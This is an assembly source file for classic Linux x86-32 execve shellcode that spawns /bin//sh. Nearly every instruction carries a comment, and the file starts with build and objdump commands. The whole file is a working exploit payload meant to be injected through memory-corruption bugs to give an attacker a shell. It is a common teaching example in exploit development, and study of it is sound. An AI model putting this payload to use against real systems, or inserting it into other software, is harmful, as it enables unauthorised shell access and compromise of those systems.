; lnx-execve-x86_32.s
; Linux EXECVE(2) shellcode for x86 instruction set.
;
; nasm -f elf32 lnx-execve-x86_32.s
; ld -m elf_i386 lnx-execve-x86_32.o -o lnx-execve-x86_32
; objdump -d lnx-execve-x86_32
BITS 32

section .text
  global _start

  _start:
    ; EXECVE(2) - execute program
    ;             int execve(const char *filename, char *const argv[], char *const envp[]);
    xor eax, eax			; Zero out EAX register.
    push eax				; Push EAX onto the stack.
    push 0x68732f2f			; Push first 4 bytes of the filename string onto the stack.
    push 0x6e69622f			; Push the remaining 4 bytes onto the stack (python: '/bin//sh'[::-1].encode('hex')).
    mov ebx, esp			; Move ESP to EBX (argv1) to point to the top of the stack where the filename has been pushed.
    push eax				; Push EAX onto the stack, EAX is zero, so the null register at that position.
    mov edx, esp			; Move ESP to EDX(argv2) to point to the top of the stack where the pushed null register is.
    push ebx				; Push the value of EBX which is the memory address of the filename onto the stack.
    mov ecx, esp			; Move ESP to ECX (argv3) to point to the top of the stack where the filename's memory address pushed is.
    mov al, 0x0b			; Move '0x0b' to AL/EAX (execve syscall number 11).
    int 0x80				; Peform sysstem call through interrupt vector 0x80.
